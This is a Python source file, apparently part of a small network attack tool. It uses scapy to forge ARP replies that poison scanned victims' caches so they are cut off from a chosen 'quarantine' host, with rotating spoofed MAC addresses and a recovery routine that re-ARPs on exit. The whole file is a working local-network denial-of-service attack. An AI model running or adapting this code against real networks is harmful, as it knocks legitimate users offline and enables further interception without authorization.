#!/usr/bin/env python

import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
from time import sleep
from sys import exit
import netifaces
from subnet import MACgen

'''
	Creates either an attack or recovery packet
'''

def createPacket(victimIP, victimMAC, deadEndIP, deadEndMAC, srcMAC, poison):
	
									#set as another users MAC for Red herring attempt
	if poison == True:
		dstMAC = "ff:ff:ff:ff:ff:fe"		#False MAC address
	else:
		dstMAC = deadEndMAC

	#Creating Poisoning packet

	#Ethernet*****************
	pkt = Ether()/ARP()	
	pkt.dst = victimMAC		#Ethernet Destination
	pkt.src = srcMAC		#Ethernet Source
	#************************
	
	#ARP**********************
	pkt.pdst= victimIP		# (IP)
	pkt.hwdst = victimMAC		# (MAC)Hey just to let you know...	
	pkt.psrc = deadEndIP		# if you're trying to talk to...
	pkt.hwsrc = dstMAC		# His MAC address is ...
	pkt.op = 2			# that's where he's at (is-at)
	#*************************
	return pkt

'''
	interface: attack on this interface
	victims: scanned hosts that will be poisoned
	quarantine: the machine they will be cut off from
	verbosity: Controls output
'''
def DenialOfService(interface, victims, quarantine, srcMAC, verbosity):

	qIP = quarantine[0]
	qMAC = quarantine[1]

	packets = []

	MAC = ""

	#Create a personalized attack packet for each host
	for ip, info in victims.iteritems():
		if srcMAC == 0:
			MAC = MACgen()
			packets.append( createPacket(ip,info[0], qIP, qMAC, MAC, True) )
		else:
			packets.append( createPacket(ip,info[0], qIP, qMAC, srcMAC, True))

	print("Turn out the lights....")

	try:
		while True:
			for pkt in packets:
				if srcMAC == 1:
					pkt[Ether].src = MACgen()
				sendp(pkt, iface=interface, verbose=0)
				
			sleep(2)

	except KeyboardInterrupt:
		print("\nRe-ARPing....")

		healPacks = []

		#Create personalized recovery packets
		for ip, info in victims.iteritems():
			if srcMAC == 0:
				healPacks.append(createPacket(ip,info[0], qIP, qMAC, MAC, False))
			else:
				healPacks.append(createPacket(ip,info[0], qIP, qMAC, srcMAC, False))
		for i in range(0, 5):
			for heal in healPacks:
				if srcMAC == 1:
					heal[Ether].src = MACgen()
				sendp(heal, iface=interface, verbose=0)
				
			sleep(1)

		exit(0)

